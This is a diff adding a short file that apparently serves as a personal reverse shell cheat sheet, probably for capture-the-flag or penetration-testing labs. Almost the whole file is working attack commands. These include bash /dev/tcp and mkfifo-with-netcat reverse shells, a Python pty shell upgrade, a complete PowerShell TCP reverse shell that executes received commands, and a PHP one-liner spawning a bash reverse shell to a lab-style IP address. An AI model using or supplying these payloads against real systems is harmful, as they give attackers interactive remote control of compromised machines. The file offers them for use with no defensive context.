@@ -1,0 +1,12 @@
+bash
+bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+
+upgrade shell after getting connection
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ip',port);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+
+php -r "system('bash -c \"bash -i >& /dev/tcp/10.10.14.245/21194 0>&1\"');"
+
+
